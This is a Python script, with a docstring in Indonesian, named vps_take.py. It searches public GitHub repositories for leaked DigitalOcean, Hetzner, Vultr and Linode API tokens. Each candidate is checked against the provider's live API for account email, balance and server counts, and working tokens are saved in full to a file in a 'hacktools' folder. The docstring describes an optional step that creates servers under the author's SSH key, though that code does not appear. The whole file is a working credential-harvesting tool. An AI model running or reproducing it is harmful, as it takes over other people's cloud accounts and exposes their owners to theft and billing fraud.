#!/usr/bin/env python3
"""
vps_take.py — cari token VPS (DigitalOcean / Hetzner / Vultr / Linode) yang bocor di
repo publik GitHub, validasi ke API asli, lalu (opsional) buat server dengan SSH key kita.

Pemakaian:
  vps_take.py hunt            # cari + validasi token
  vps_take.py hunt --provision DO|HZ|VULTR|LINODE
Output:
  $HOME/hacktools/vpscamp/found.jsonl   (token di-mask di stdout, full di file, mode 600)
"""
import argparse, base64, hashlib, json, os, re, sys, time
import requests

TOK = open('$HOME/.gh-token').read().strip()
GH = {"Authorization": f"token {TOK}", "Accept": "application/vnd.github+json",
      "User-Agent": "Mozilla/5.0"}
OUT = "$HOME/hacktools/vpscamp"
os.makedirs(OUT, exist_ok=True)
SSH_PUB = open('$HOME/.ssh/id_dery.pub').read().strip()

PATTERNS = {
    "do_token": re.compile(r"\b(dop_v1_[a-f0-9]{64})\b"),
    "hetzner_token": re.compile(r"\b([A-Za-z0-9]{64})\b"),
    "vultr_key": re.compile(r"(?i)VULTR[_\- ]?(?:API[_\- ]?)?KEY\s*[=:\"']{1,3}\s*([A-Z0-9]{20,40})"),
    "linode_token": re.compile(r"(?i)LINODE[_\- ]?(?:API[_\- ]?)?(?:TOKEN|KEY)\s*[=:\"']{1,3}\s*([a-f0-9]{64})"),
}

QUERIES = [
    ("do_token",      'dop_v1_ path:.env'),
    ("do_token",      'DIGITALOCEAN_ACCESS_TOKEN path:.env'),
    ("do_token",      'do_token filename:terraform.tfvars'),
    ("hetzner_token", 'HCLOUD_TOKEN path:.env'),
    ("hetzner_token", 'hcloud_token filename:terraform.tfvars'),
    ("vultr_key",     'VULTR_API_KEY path:.env'),
    ("linode_token",  'LINODE_TOKEN path:.env'),
    ("do_token",      'dop_v1_ filename:.env.local'),
    ("do_token",      'dop_v1_ filename:docker-compose.yml'),
]


def gh_search(q, pages=1):
    items = []
    for p in range(1, pages + 1):
        r = requests.get("https://api.github.com/search/code",
                         params={"q": q, "per_page": 100, "page": p},
                         headers=GH, timeout=30)
        if r.status_code == 403 or r.status_code == 429:
            time.sleep(20)
            continue
        if r.status_code != 200:
            return items, f"HTTP {r.status_code}"
        j = r.json()
        items += j.get("items", [])
        if len(j.get("items", [])) < 100:
            break
        time.sleep(7)
    return items, ""


def gh_file(item):
    full = item["repository"]["full_name"]
    path = item["path"]
    url = f"https://api.github.com/repos/{full}/contents/{path}"
    r = requests.get(url, params={"ref": item.get("sha")}, headers=GH, timeout=30)
    if r.status_code != 200:
        return ""
    try:
        j = r.json()
        if isinstance(j, dict) and j.get("content"):
            return base64.b64decode(j["content"]).decode("utf8", "ignore")
    except Exception:
        pass
    return ""


# ---------- validators ----------
def v_do(t):
    r = requests.get("https://api.digitalocean.com/v2/account",
                     headers={"Authorization": f"Bearer {t}"}, timeout=25)
    if r.status_code != 200:
        return None
    a = r.json().get("account", {})
    return {"provider": "DO", "status": a.get("status"), "email": a.get("email"),
            "droplets": a.get("droplet_limit"), "balance": a.get("balance")}


def v_hz(t):
    r = requests.get("https://api.hetzner.cloud/v1/servers",
                     headers={"Authorization": f"Bearer {t}"}, timeout=25)
    if r.status_code != 200:
        return None
    return {"provider": "HZ", "servers": len(r.json().get("servers", []))}


def v_vultr(t):
    r = requests.get("https://api.vultr.com/v2/account",
                     headers={"Authorization": f"Bearer {t}"}, timeout=25)
    if r.status_code != 200:
        return None
    a = r.json().get("account", {})
    return {"provider": "VULTR", "email": a.get("email"), "balance": a.get("balance"),
            "name": a.get("name")}


def v_linode(t):
    r = requests.get("https://api.linode.com/v4/account",
                     headers={"Authorization": f"Bearer {t}"}, timeout=25)
    if r.status_code != 200:
        return None
    a = r.json()
    return {"provider": "LINODE", "email": a.get("email"), "balance": a.get("balance")}


VALIDATORS = {"do_token": v_do, "hetzner_token": v_hz, "vultr_key": v_vultr,
              "linode_token": v_linode}


def hunt(pages):
    seen = set()
    found = []
    for kind, q in QUERIES:
        items, err = gh_search(q, pages)
        print(f"[q] {q!r:55} -> {len(items)} hits {err}", flush=True)
        for it in items:
            key = (it["repository"]["full_name"], it["path"])
            if key in seen:
                continue
            seen.add(key)
            text = gh_file(it)
            if not text:
                continue
            cand = [m.group(1) for m in PATTERNS[kind].finditer(text)]
            if kind == "hetzner_token":
                cand = [c for c in cand if re.search(r"HCLOUD|hetzner", text, re.I)][:3]
            for tok in dict.fromkeys(cand[:6]):
                if tok in {f["token"] for f in found}:
                    continue
                info = VALIDATORS[kind](tok)
                if info:
                    info.update({"token": tok, "kind": kind,
                                 "repo": it["repository"]["full_name"], "path": it["path"],
                                 "url": it["html_url"]})
                    found.append(info)
                    print("  [VALID]", json.dumps({k: v for k, v in info.items() if k != "token"}),
                          flush=True)
                    with open(f"{OUT}/found.jsonl", "a") as fh:
                        fh.write(json.dumps(info) + "\n")
        time.sleep(7)
    return found


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("action", choices=["hunt"])
    ap.add_argument("--pages", type=int, default=1)
    ap.add_argument("--provision", choices=["DO", "HZ", "VULTR", "LINODE"])
    a = ap.parse_args()
    res = hunt(a.pages)
    print(f"[+] valid tokens: {len(res)}")
